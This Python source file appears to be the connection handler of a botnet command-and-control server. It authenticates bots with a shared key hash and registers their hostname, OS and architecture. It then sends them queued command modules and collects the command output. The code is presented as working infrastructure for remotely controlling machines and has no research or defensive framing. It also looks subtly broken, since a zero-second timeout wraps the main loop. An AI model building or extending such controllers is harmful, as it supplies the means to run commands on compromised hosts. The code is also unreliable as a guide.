import asyncio
import hashlib
import logging
import time

from server.commands import CommandQueue
from server.db import Database
from shared.crypto import AESCrypto
from shared.protocol import (
    MessageType,
    create_auth_ack,
    create_cmd,
    deserialize,
    serialize,
)

logger = logging.getLogger(__name__)

NONCE_MAX_AGE = 300.0
HEARTBEAT_INTERVAL = 30.0
HEARTBEAT_TIMEOUT = 90.0
TIMESTAMP_MAX_DRIFT = 60.0


async def handle_bot(reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
                     crypto: AESCrypto, db: Database, cmd_queue: CommandQueue):
    addr = writer.get_extra_info("peername")
    ip = addr[0] if addr else "unknown"
    port = addr[1] if addr else 0
    logger.info("New connection from %s:%s", ip, port)

    bot_id = None
    session_id = ""

    try:
        # ── Step 1: Auth ────────────────────────────────────
        auth_msg = await _read_message(reader, crypto, db)
        if auth_msg is None or auth_msg.type != MessageType.AUTH:
            logger.warning("Auth failed from %s:%s — no auth message", ip, port)
            return

        key_hash = hashlib.sha256(crypto._aesgcm._key).hexdigest()  # verify key hash
        expected_hash = auth_msg.data.get("key_hash", "")
        bot_id = auth_msg.data.get("bot_id", "unknown")

        if not _constant_time_compare(key_hash, expected_hash):
            ack = create_auth_ack("fail", "")
            writer.write(serialize(ack, crypto))
            await writer.drain()
            logger.warning("Auth rejected: %s (key mismatch)", bot_id)
            return

        session_id = hashlib.sha256(f"{bot_id}:{time.time()}".encode()).hexdigest()[:16]
        ack = create_auth_ack("ok", session_id)
        writer.write(serialize(ack, crypto))
        await writer.drain()
        logger.info("Auth OK: %s session=%s", bot_id, session_id)

        # ── Step 2: Receive system info ─────────────────────
        info_msg = await _read_message(reader, crypto, db)
        if info_msg is None or info_msg.type != MessageType.INFO:
            logger.warning("No info from %s", bot_id)
            return

        d = info_msg.data
        await db.add_bot(
            bot_id=bot_id, ip=ip, port=port,
            os_name=d.get("os", ""),
            os_version=d.get("os_version", ""),
            arch=d.get("arch", ""),
            kernel=d.get("kernel", ""),
            hostname=d.get("hostname", ""),
            session_id=session_id,
        )
        logger.info("Bot registered: %s (%s %s %s)", bot_id, d.get("hostname"), d.get("os"), d.get("arch"))

        # ── Step 3: Heartbeat + Command loop ────────────────
        last_heartbeat = time.time()
        async with asyncio.timeout(0):  # non-blocking, tự quản lý timeout
            while True:
                try:
                    msg = await asyncio.wait_for(
                        _read_message(reader, crypto, db), timeout=1.0
                    )
                except asyncio.TimeoutError:
                    msg = None

                now = time.time()

                # Heartbeat timeout check
                if now - last_heartbeat > HEARTBEAT_TIMEOUT:
                    logger.warning("Bot %s heartbeat timeout (%.0fs)", bot_id, now - last_heartbeat)
                    await db.mark_bot_offline(bot_id)
                    break

                if msg is not None:
                    if msg.type == MessageType.HEARTBEAT:
                        last_heartbeat = now
                        await db.update_bot_last_seen(bot_id)

                    elif msg.type == MessageType.RESULT:
                        cmd_id = msg.data.get("cmd_id", "")
                        output = msg.data.get("output", "")
                        exit_code = msg.data.get("exit_code", -1)
                        await db.update_command(cmd_id, output, exit_code)
                        logger.info("Result from %s: cmd=%s exit=%d", bot_id, cmd_id, exit_code)

                    elif msg.type == MessageType.ERROR:
                        logger.error("Error from %s: %s", bot_id, msg.data)

                # Gửi pending commands
                pending = cmd_queue.dequeue(bot_id)
                if pending:
                    cmd_msg = create_cmd(pending.cmd_id, pending.module, pending.params)
                    writer.write(serialize(cmd_msg, crypto))
                    await writer.drain()
                    await db.add_command(pending.cmd_id, bot_id, pending.module, pending.params)
                    logger.info("Sent cmd to %s: %s/%s", bot_id, pending.module, pending.cmd_id)

    except asyncio.CancelledError:
        pass
    except Exception:
        logger.exception("Handler error for bot %s", bot_id)
    finally:
        if bot_id:
            await db.mark_bot_offline(bot_id)
        try:
            writer.close()
            await writer.wait_closed()
        except Exception:
            pass
        logger.info("Connection closed: %s", bot_id or f"{ip}:{port}")


async def _read_message(reader: asyncio.StreamReader, crypto: AESCrypto, db: Database):
    """Đọc và parse một message từ stream, có kiểm tra nonce + timestamp."""
    try:
        length_bytes = await reader.readexactly(4)
        length = int.from_bytes(length_bytes, "big")
        if length > 1_000_000:
            logger.warning("Message too large: %d bytes", length)
            return None
        encrypted = await reader.readexactly(length)
        msg = deserialize(length_bytes + encrypted, crypto)

        # Chống replay: check nonce
        if await db.is_nonce_used(msg.nonce):
            logger.warning("Replay attack detected: nonce %s", msg.nonce)
            return None
        await db.mark_nonce(msg.nonce)

        # Chống replay: check timestamp drift
        drift = abs(time.time() - msg.timestamp)
        if drift > TIMESTAMP_MAX_DRIFT:
            logger.warning("Timestamp drift too large: %.0fs", drift)
            return None

        return msg
    except asyncio.IncompleteReadError:
        return None
    except Exception:
        logger.exception("Error reading message")
        return None


def _constant_time_compare(a: str, b: str) -> bool:
    """So sánh hash an toàn chống timing attack."""
    if len(a) != len(b):
        return False
    result = 0
    for x, y in zip(a, b):
        result |= ord(x) ^ ord(y)
    return result == 0
